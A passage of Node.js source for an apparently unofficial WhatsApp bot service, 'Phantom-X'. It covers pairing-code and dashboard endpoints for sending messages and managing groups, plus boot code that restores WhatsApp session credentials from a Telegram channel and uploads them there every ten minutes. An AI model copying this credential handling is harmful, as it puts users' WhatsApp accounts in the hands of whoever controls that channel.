        await new Promise(r => setTimeout(r, 1500));
        const code = await _ph_safeRequestPairingCode(webSock, num);
        const pretty = (code || '').match(/.{1,4}/g)?.join('-') || code;
        if (webPairSessions[sessionId]) {
          webPairSessions[sessionId].code = pretty;
          webPairSessions[sessionId].status = 'code_ready';
        }
        return pretty;
      } catch (err) {
        console.error('[web-pair] requestPairingCode failed:', err?.message);
        await failWebPair('web-pair-code-failed', webSock);
        return null;
      }
    })();

    const code = await codePromise;
    if (!code) {
      return res.json({ ok: false, error: 'Failed to generate pairing code. Try again.' });
    }

    return res.json({ ok: true, code, sessionId });
  } catch (e) {
    console.error('[web-pair]', e);
    res.json({ ok: false, error: e.message });
  }
});

// Check pairing status
app.get('/api/status', (req, res) => {
  const { id } = req.query;
  if (!id || !webPairSessions[id]) return res.json({ ok: false, status: 'not_found' });
  const sess = webPairSessions[id];
  res.json({
    ok: true,
    status: sess.status,
    phone: sess.phone,
    connectedAt: sess.connectedAt || null,
    botNumber: sess.sock?.user?.id?.split(':')[0]?.split('@')[0] || null
  });
});

// ═══════════════════════════════════════════
// ══ SESSION API (Dashboard) ═════════════════
// ═══════════════════════════════════════════

// Resolve the authenticated user email from a request (cookie or Bearer token)
function getAuthEmail(req) {
  const token = req.cookies?.eo_token || req.headers.authorization?.replace('Bearer ', '');
  if (!token) return null;
  const sess = webSessions[token];
  if (!sess) return null;
  return sess.email || null;
}

// Get session sock by sessionId — also verifies the caller owns the session.
// Default-deny: if the session has no owner email recorded, access is denied
// to prevent legacy/ownerless sessions from being accessible to any authenticated user.
function getWebSock(sessionId, callerEmail) {
  const sess = webPairSessions[sessionId];
  if (!sess || sess.status !== 'connected') return null;
  // Ownership check: callerEmail must match the session's recorded owner.
  // Sessions with no recorded owner are denied to all callers (default-deny).
  if (!sess.email || sess.email !== callerEmail) return null;
  return sess.sock || null;
}

// Session info
app.get('/api/s/:sid/info', (req, res) => {
  const email = getAuthEmail(req);
  if (!email) return res.status(401).json({ ok: false, error: 'Not authenticated' });
  const sock = getWebSock(req.params.sid, email);
  const sess = webPairSessions[req.params.sid];
  if (!sock || !sess) return res.json({ ok: false, error: 'Session not found' });
  res.json({
    ok: true,
    connected: sess.status === 'connected',
    phone: sess.phone,
    email: sess.email || null,
    botNumber: sock.user?.id?.split(':')[0]?.split('@')[0] || null,
    platform: sock.authState?.creds?.platform || 'unknown',
    uptime: formatUptime(Date.now() - botStartTime),
    connectedAt: sess.connectedAt
  });
});

// List groups
app.get('/api/s/:sid/groups', async (req, res) => {
  const email = getAuthEmail(req);
  if (!email) return res.status(401).json({ ok: false, error: 'Not authenticated' });
  const sock = getWebSock(req.params.sid, email);
  if (!sock) return res.json({ ok: false, error: 'Session not found' });
  try {
    const groups = await sock.groupFetchAllParticipating();
    const list = Object.entries(groups).map(([id, meta]) => ({
      id,
      name: meta.subject || 'Unknown',
      members: meta.participants?.length || 0,
      isAdmin: meta.participants?.some(p => {
        const pNum = p.id?.split(':')[0]?.split('@')[0];
        const botNum = sock.user?.id?.split(':')[0]?.split('@')[0];
        return pNum === botNum && (p.admin === 'admin' || p.admin === 'superadmin');
      }) || false,
      announce: !!meta.announce
    }));
    res.json({ ok: true, groups: list });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

// Send message
app.post('/api/s/:sid/send', async (req, res) => {
  const email = getAuthEmail(req);
  if (!email) return res.status(401).json({ ok: false, error: 'Not authenticated' });
  const sock = getWebSock(req.params.sid, email);
  if (!sock) return res.json({ ok: false, error: 'Session not found' });
  const { jid, message } = req.body;
  if (!jid || !message) return res.json({ ok: false, error: 'jid and message required' });
  try {
    await sock.sendMessage(jid, { text: message });
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

// Group invite link
app.get('/api/s/:sid/group/invite', async (req, res) => {
  const email = getAuthEmail(req);
  if (!email) return res.status(401).json({ ok: false, error: 'Not authenticated' });
  const sock = getWebSock(req.params.sid, email);
  if (!sock) return res.json({ ok: false, error: 'Session not found' });
  const { jid } = req.query;
  if (!jid) return res.json({ ok: false, error: 'jid required' });
  try {
    const code = await sock.groupInviteCode(jid);
    res.json({ ok: true, link: `https://chat.whatsapp.com/${code}` });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

// Group leave
app.post('/api/s/:sid/group/leave', async (req, res) => {
  const email = getAuthEmail(req);
  if (!email) return res.status(401).json({ ok: false, error: 'Not authenticated' });
  const sock = getWebSock(req.params.sid, email);
  if (!sock) return res.json({ ok: false, error: 'Session not found' });
  const { groupJid } = req.body;
  if (!groupJid) return res.json({ ok: false, error: 'groupJid required' });
  try {
    await sock.groupLeave(groupJid);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

// Group revoke invite
app.post('/api/s/:sid/group/revoke', async (req, res) => {
  const email = getAuthEmail(req);
  if (!email) return res.status(401).json({ ok: false, error: 'Not authenticated' });
  const sock = getWebSock(req.params.sid, email);
  if (!sock) return res.json({ ok: false, error: 'Session not found' });
  const { groupJid } = req.body;
  if (!groupJid) return res.json({ ok: false, error: 'groupJid required' });
  try {
    await sock.groupRevokeInvite(groupJid);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

// Toggle group settings
app.post('/api/s/:sid/toggle', async (req, res) => {
  const email = getAuthEmail(req);
  if (!email) return res.status(401).json({ ok: false, error: 'Not authenticated' });
  const sock = getWebSock(req.params.sid, email);
  if (!sock) return res.json({ ok: false, error: 'Session not found' });
  const { groupJid, setting, value } = req.body;
  try {
    if (setting === 'lock') await sock.groupSettingUpdate(groupJid, value ? 'announcement' : 'not_announcement');
    else setGroupSetting(groupJid, setting, value);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

// SSE Stream (basic)
app.get('/api/s/:sid/stream', (req, res) => {
  const email = getAuthEmail(req);
  if (!email) { res.status(401).end(); return; }
  const sess = webPairSessions[req.params.sid];
  if (!sess || (sess.email && sess.email !== email)) { res.status(403).end(); return; }
  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive' });
  res.write('data: {"type":"connected"}\n\n');
  const interval = setInterval(() => {
    const s = webPairSessions[req.params.sid];
    if (s) {
      res.write(`data: ${JSON.stringify({ type: 'status', connected: s.status === 'connected' })}\n\n`);
    }
  }, 5000);
  req.on('close', () => clearInterval(interval));
});

// ═══════════════════════════════════════════
// ══ LEGACY ROUTES ═══════════════════════════
// ═══════════════════════════════════════════

function anySocketConnected() {
  if (isConnected) return true;
  return Object.values(activeSockets).some(s => s?.isConnected);
}
app.get('/health', (req, res) => res.json({ status: 'ok', connected: anySocketConnected(), pairing: isPairing, users: getLinkedCount() }));
app.get('/qr', async (req, res) => {
  if (currentQR) { const buf = await qrcode.toBuffer(currentQR); res.set('Content-Type', 'image/png'); res.send(buf); }
  else res.send(isConnected ? 'Connected — no QR' : 'No QR. Use Telegram /pair or restart.');
});

app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Server on ${PORT}`));

// ── BOOT ───────────────────────────────────────────────────────────────
async function main() {
  console.log('🚀 Phantom-X starting...');
  // Per-user data (mode, aliases, prefix, autoreact, persona) loaded on-demand from user_sessions/*.json
  // loadPersonas() removed — personas now in user_sessions/*.json
  loadSessions();
  loadPollCache();
  loadGroupSettings();
  loadWarnings();
  loadWelcome();
  loadSchedules();
  loadLinked();

  // ── Telegram init with retry (handles transient EFATAL/Network errors) ──
  let telegramReady = false;
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      telegramBot = await initTelegram();
      if (telegramBot) {
        telegramReady = true;
        console.log(`[boot] ✅ Telegram ready (attempt ${attempt}/3)`);
        break;
      }
    } catch (e) {
      console.log(`[boot] ⚠️ Telegram init failed (attempt ${attempt}/3): ${e.message?.slice(0, 100)}`);
      if (attempt < 3) await new Promise(r => setTimeout(r, 15000 * attempt));  // backoff
    }
  }
  if (!telegramReady) {
    console.log('[boot] ⚠️ Telegram not available — bot will operate without /pair interface');
    console.log('[boot]    Will retry Telegram every 60s in background');
    // Background retry loop
    const telegramRetryInterval = setInterval(async () => {
      if (telegramBot) return;  // already up
      try {
        telegramBot = await initTelegram();
        if (telegramBot) {
          clearInterval(telegramRetryInterval);
          console.log('[boot] ✅ Telegram recovered via background retry');
          // Try restore now if we didn't before
          if (!_ph_isAuthComplete(AUTH_DIR) && TELEGRAM_BACKUP_CHANNEL) {
            console.log('[boot] Now attempting restore from Telegram channel...');
            try { await restoreAuthFromChannel(); } catch (_) {}
          }
        }
      } catch (_) { /* keep retrying */ }
    }, 60000);
  }

  const authExists = fs.existsSync(AUTH_DIR) && fs.readdirSync(AUTH_DIR).length > 0;
  const dataExists = fs.existsSync(USERS_FILE);
  if ((!authExists || !dataExists) && TELEGRAM_BACKUP_CHANNEL && telegramReady) {
    console.log(`[boot] Restore needed — auth=${authExists}, data=${dataExists}. Trying Telegram channel...`);
    // Restore with retry
    let restored = false;
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        restored = await restoreAuthFromChannel();
        if (restored) {
          console.log(`[boot] ✅ Full restore from channel complete (attempt ${attempt}/3)`);
          break;
        } else {
          console.log(`[boot] No backup found in pinned message (attempt ${attempt}/3)`);
        }
      } catch (e) {
        console.log(`[boot] ⚠️ Restore failed (attempt ${attempt}/3): ${e.message?.slice(0, 100)}`);
        if (attempt < 3) await new Promise(r => setTimeout(r, 10000 * attempt));
      }
    }
    if (!restored) console.log('[boot] ⚠️ No valid backup restored — bot will need manual /pair');
  }

  migrateLegacyPollCache();

  // Only auto-connect sessions that actually have usable auth.
  // Without this guard, the bot boots even when there is no pinned backup and
  // no local session, then Baileys creates an empty auth folder and we keep
  // reconnecting forever with "phone=null origin=boot".
  const mainAuthComplete = _ph_isAuthComplete(AUTH_DIR);
  if (mainAuthComplete) {
    console.log('[boot] Main auth found locally — auto-connecting main session');
    startBot(null, null, 'boot').catch(console.error);
  } else {
    console.log('[boot] No valid main auth found locally — skipping main auto-connect');
    try {
      if (fs.existsSync(AUTH_DIR)) {
        const stat = _ph_authStatus(AUTH_DIR);
        console.log(`[boot] Removing incomplete main auth folder: ${JSON.stringify(stat)}`);
        fs.rmSync(AUTH_DIR, { recursive: true, force: true });
      }
    } catch (e) {
      console.error('[boot] Failed to clean incomplete main auth:', e.message);
    }
  }

  // Connect any existing multi-session auth folders, but ONLY if complete.
  setTimeout(() => {
    try {
      const dirs = fs.readdirSync('.', { withFileTypes: true });
      for (const d of dirs) {
        if (d.isDirectory() && d.name.startsWith('auth_info_') && d.name !== 'auth_info') {
          const numKey = d.name.replace('auth_info_', '');
          if (activeSockets[numKey]) continue; // already connected
          if (!_ph_isAuthComplete(d.name)) {
            console.log(`[boot] Skipping incomplete multi-session auth: ${d.name}`);
            try { fs.rmSync(d.name, { recursive: true, force: true }); } catch (_) {}
            continue;
          }
          console.log(`[boot] Found existing multi-session auth: ${d.name}, auto-connecting...`);
          startBot(null, null, 'boot', { authDir: d.name, socketKey: numKey }).catch(e => console.error('[boot-multi]', e.message));
        }
      }
    } catch (e) { console.error('[boot-multi-scan]', e.message); }
  }, 5000);

  // Periodic backup every 10 minutes — ensures new web accounts and data are saved
  setInterval(async () => {
    try {
      await backupAuthToChannel();
    } catch (e) { console.error('[periodic-backup]', e.message); }
  }, 10 * 60 * 1000); // 10 minutes
}
main();

process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);
process.on('unhandledRejection', console.error);
